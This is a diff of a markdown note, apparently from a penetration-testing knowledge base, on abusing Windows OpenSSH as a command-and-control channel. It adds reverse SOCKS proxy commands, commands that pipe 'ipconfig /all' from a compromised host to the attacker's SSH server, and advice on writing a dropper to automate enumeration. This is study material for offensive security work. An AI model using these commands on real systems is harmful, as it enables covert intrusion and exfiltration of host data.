@@ -1,13 +1,16 @@
 # Remote Clients
 
-[[04 - Remote Port Forwarding]]
+Search Tag(s): #initial-access #living-off-the-foreign-land #living-off-the-land
 
-### SOCKS Proxy
+Refer to this [[04 - Remote Port Forwarding|section]] for remote port forwarding to configure the user without any requirement for authentication.
 
-Instead of dropping malware instead we'll use `proxychains` with the SSH server (the attacker's server) as a command and control which is legitimate, safer, and more familiar performing things remotely. This is considered as a non-malware implant.
+### Reverse SOCKS Proxy
+
+Instead of dropping malware instead we'll use `proxychains` or `privoxy` with the SSH server (the attacker's server) as the command and control which is legitimate, safer, and more familiar performing things remotely. This is considered as a non-malware implant.
 
 ```
 C:\Windows\System32\OpenSSH\ssh.exe [-p <PORT>] -NTfCqR <SOCKS_proxy> -o "StrictHostKeyChecking=no"
+%SYSTEMDIRECTORY%\OpenSSH\ssh.exe [-p <PORT>] -NTfCqR <SOCKS_proxy> -o "StrictHostKeyChecking=no"
 ```
 
 In the SSH server we should see a listening port of the SOCKS Proxy.
@@ -16,7 +19,12 @@ In the SSH server we should see a listening port of the SOCKS Proxy.
 $ ss -antpl
 ```
 
-However, there is a limitation since it contains no limitation. To resolve this issue you must perform local enumeration to gather information of the compromised target that was established via SSH.
+However, there is a limitation since it contains no limitation. To resolve this issue you must perform local enumeration to gather information of the compromised target that was established via SSH. Include a shell scripting file or a custom dropper containing commands to automate the process. It doesn't have to be all of them but the more the better. At least collect the IPv4 address.
+
+```
+ipconfig /all | C:\Windows\System32\OpenSSH\ssh.exe [-p <PORT>] "cat - > %COMPUTERNAME%_IP_configuration.txt"
+ipconfig /all | %SYSTEMDIRECTORY%\OpenSSH\ssh.exe [-p <PORT>] "cat - > %COMPUTERNAME%_IP_configuration.txt"
+```
 
 ### Download File and Execute
 
@@ -45,7 +53,13 @@ C:\> ssh -i \\<attacker_IP>\key.pem root@<IP>
 
 - [[SCP|File Transfer: SCP]]
 
+### LOLBAS
+
 - [LOLBAS: SSH](https://lolbas-project.github.io/lolbas/Binaries/Ssh/)
+
+### Bitsadmin
+
+- [BITSADMIN Blog: Living Off the Foreign Land](https://blog.bitsadmin.com/living-off-the-foreign-land-windows-as-offensive-platform)
 
 ### RedSiege
 
